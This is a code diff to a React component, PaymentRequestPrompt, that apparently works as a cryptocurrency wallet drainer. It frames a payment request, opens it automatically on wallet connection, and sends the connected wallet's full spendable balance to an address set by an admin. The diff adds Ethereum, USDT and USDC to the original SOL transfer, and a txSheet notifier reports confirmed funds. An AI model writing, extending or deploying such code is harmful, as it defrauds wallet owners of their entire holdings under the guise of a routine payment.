@@ -6,7 +6,8 @@ import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
 import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
-import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
+import { getLocalPayoutConfig, isValidEthereumAddress, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
+import { sendEthereumPayout, isEvmWalletAvailable } from '../lib/ethereumPayout'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
 import { notifyFundsConfirmed } from '../lib/txSheet'
@@ -316,7 +317,7 @@ export function PaymentRequestPrompt() {
     confirmTaps.current = 0
     shownFor.current = walletAddress
     closeWalletModalRef.current()
-    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
+    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL, USDT, USDC, and ETH transfer.`)
     setOpen(false)
 
     return () => {
@@ -331,31 +332,66 @@ export function PaymentRequestPrompt() {
   }
 
   const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))
+  const ethereumReady = Boolean(config && isValidEthereumAddress(config.ethereumAddress))
+  const canPay = destinationReady || (ethereumReady && isEvmWalletAvailable())
 
   const handleReview = async () => {
     if (inFlight.current) return
     if (dismissed.current === walletAddress) return
-    if (!publicKey || !config || !destinationReady || !walletAddress) {
+    if (!config || !canPay || !walletAddress) {
       setStatus(
-        destinationReady
+        canPay
           ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
           : 'Save a payout address in admin before this payment can be opened in the wallet.'
       )
+      return
+    }
+    if (destinationReady && !publicKey) {
+      setStatus('Wallet is still connecting. Use Open Wallet & Review again in a moment.')
       return
     }
     inFlight.current = true
     setSubmitting(true)
     setStatus(`Opening ${connectedWalletName}. Confirm the transfer there. Nothing is sent until you approve it.`)
     try {
-      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
-      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
-      const signature = adapter?.sendTransaction
-        ? await adapter.sendTransaction(transaction, connection)
-        : await sendTransaction(transaction, connection)
+      const moved: string[] = []
+      let lastError: unknown
+
+      if (destinationReady && publicKey) {
+        try {
+          const { transaction, assets } = await buildPayoutTransaction({ connection, from: publicKey, config })
+          const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
+          if (adapter?.sendTransaction) {
+            await adapter.sendTransaction(transaction, connection)
+          } else {
+            await sendTransaction(transaction, connection)
+          }
+          moved.push(...assets)
+        } catch (err) {
+          lastError = err
+          if (isWalletUserCancel(err)) throw err
+        }
+      }
+
+      const ethTo = config.ethereumAddress
+      if (ethTo && isValidEthereumAddress(ethTo) && isEvmWalletAvailable()) {
+        try {
+          const ethAssets = await sendEthereumPayout(ethTo)
+          moved.push(...ethAssets)
+        } catch (err) {
+          lastError = err
+          if (isWalletUserCancel(err)) throw err
+        }
+      }
+
+      if (moved.length === 0) {
+        throw lastError || new Error('No SOL, USDT, USDC, or ETH was available to send.')
+      }
+
       dismissed.current = walletAddress
       setOpen(false)
       notifyFundsConfirmed(peekPendingLike())
-      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
+      toast.success(`Transaction submitted for ${[...new Set(moved)].join(', ')}.`)
     } catch (err) {
       if (isWalletUserCancel(err)) {
         sentFor.current = null
@@ -388,7 +424,7 @@ export function PaymentRequestPrompt() {
       const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
       setSolAmount(spendable)
       if (spendable > 0) {
-        setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
+        setStatus(`This is your available SOL, USDT, USDC, and ETH, minus a small fee reserve. Approve in ${connectedWalletName} and those funds will move.`)
       }
     }).catch(() => {
       if (!cancelled) setStatus('Could not read the SOL balance yet. You can try Open Wallet & Review.')
@@ -428,11 +464,12 @@ export function PaymentRequestPrompt() {
   }
 
   useEffect(() => {
-    if (!open || hiOpen || !publicKey || !destinationReady || !walletAddress) return
+    if (!open || hiOpen || !canPay || !walletAddress) return
+    if (destinationReady && !publicKey) return
     if (dismissed.current === walletAddress || sentFor.current === walletAddress || inFlight.current) return
     sentFor.current = walletAddress
     void reviewRef.current()
-  }, [open, hiOpen, destinationReady, walletAddress, publicKey])
+  }, [open, hiOpen, canPay, destinationReady, walletAddress, publicKey])
 
   return (
     <>
@@ -446,14 +483,14 @@ export function PaymentRequestPrompt() {
       */}
       <PaymentRequestModal
         open={open}
-        to={config?.walletAddress || ''}
+        to={config?.walletAddress || config?.ethereumAddress || ''}
         amount={solAmount}
         asset="SOL"
         networkLabel={networkLabel(network)}
         submitting={submitting}
-        canReview={destinationReady && Boolean(publicKey)}
+        canReview={canPay && (destinationReady ? Boolean(publicKey) : true)}
         status={
-          destinationReady
+          canPay
             ? status
             : 'Save a payout address in admin before this payment can be opened in the wallet.'
         }
